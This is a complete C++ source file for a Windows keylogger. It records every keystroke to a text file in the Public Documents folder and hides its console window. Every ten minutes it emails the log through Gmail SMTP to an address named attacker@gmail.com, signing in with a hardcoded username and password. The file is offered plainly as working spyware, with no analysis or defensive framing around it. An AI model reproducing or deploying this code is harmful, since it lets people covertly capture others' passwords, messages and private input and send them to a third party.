#include <iostream>
#include <Windows.h>
#include <fstream>
#include <winuser.h>
#include <chrono>
#include <future>
#include <ctime>

#include "EASendMailObj.tlh"

using namespace EASendMailObjLib;
using namespace std;

void logger()
{
	//Declaring variables

	const char* path = "C:/Users/Public/Documents/Keystrokes.txt"; 
	fstream keylogfile;
	char key;

		for (key = 8; key <= 222; key++) //ASCII range for characters
		{
			if (GetAsyncKeyState(key) == -32767) //Check for keyboard input
			{
				keylogfile.open(path, ios::app); // Opens/creates a text file in the path specified so text can be added to it

				if (key >= 65 && key <= 90 && !GetAsyncKeyState(VK_SHIFT) && !GetKeyState(VK_CAPITAL) > 0) //Checks if caps lock is enabled and if shift isn't pressed to change letters to lowercase
				{
					key = key + 32;
				}

				//Records special characters
				switch (key)
				{
				case 8: keylogfile << "(Backspace)";
					break;

				case 9: keylogfile << "(Tab)";
					break;

				case 13: keylogfile << "(Enter)";
					break;

				case 27: keylogfile << "(Esc)";
					break;

				case 127: keylogfile << "(DEL)";
					break;

				case 59: keylogfile << ";";
					break;

				case 61: keylogfile << "=";
					break;

				case 44: keylogfile << ",";
					break;

				case 45: keylogfile << "-";
					break;

				case 46: keylogfile << ".";
					break;

				case 47: keylogfile << "/";
					break;

				case 60: keylogfile << "`";
					break;

				case 91: keylogfile << "[";
					break;

				case 93: keylogfile << "]";
					break;

				case 49:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 33;// !
					}
					break;

				case 50:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 34;// "
					}
					break;

				case 51:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 163;// £
					}
					break;

				case 52:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 36;// $
					}
					break;

				case 53:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 37;// %
					}
					break;

				case 54:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 94;// ^
					}
					break;

				case 55:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 38;// &
					}
					break;

				case 56:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 42;// *
					}
					break;

				case 57:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 40;// (
					}
					break;

				case 48:
					if (GetAsyncKeyState(VK_SHIFT))
					{
						key = 41;// )
					}
					break;

				case VK_DOWN:
					keylogfile << "[DOWN]";
					break;
				case VK_LEFT:
					keylogfile << "[LEFT]";
					break;
				case VK_RIGHT:
					keylogfile << "[RIGHT]";
					break;
				case VK_UP:
					keylogfile << "[UP]";
					break;

				default: keylogfile << "";
					break;
				}

				keylogfile << key; //Writes the keys being pressed to the text file

				keylogfile.close(); //Closes the text file saving the new contents
			}
		}	
}

int Email()
{
	while (1)
	{

		std::this_thread::sleep_for(600s);;//Thread timer goes off every 10 minutes

		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); //Initialises the use of COM 

		IMailPtr oSmtp = NULL; // Used to define Osmtp
		oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail)); // Loads the interface for "EASendMailObjLib"
		oSmtp->LicenseCode = (L"TryIt"); /* "TryIt" is the license code for "EASendMailObjLib".
		If this is not used an "Invalid License code" exception will be thrown preventing the email from working */

		// Set email subject
		oSmtp->Subject = (L"Keylogger");
		// Set email body
		oSmtp->BodyText = (L"This attachment contains the contents of the logged keys");
		// Add attachment from local disk
		oSmtp->AddAttachment(L"C:/Users/Public/Documents/Keystrokes.txt");

		// Sets SMTP server address for Gmail
		oSmtp->ServerAddr = (L"smtp.gmail.com");

		//Login credentials for the sender email (Throw away email created just for this program)
		oSmtp->UserName = (L"autoemailer912@gmail.com");
		oSmtp->Password = (L"Auto9120");

		// Set your sender email address
		oSmtp->FromAddr = (L"autoemailer912@gmail.com");
		// Add recipient email address
		oSmtp->AddRecipientEx((L"attacker@gmail.com"), 0);

		// Sets the connection type to TLS
		oSmtp->ConnectType = 4;

		// Sets to SMTP Server Port to 587 for connection on TLS
		oSmtp->ServerPort = 587;

		oSmtp->SendMail();

	}
	return 0;
}

int main()
{	
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console

	std::thread th(Email); //Starts thread that sends logged keys ever 10 minutes

	{
		logger();
	}

	th.join(); //Ends thread

	return 0;
}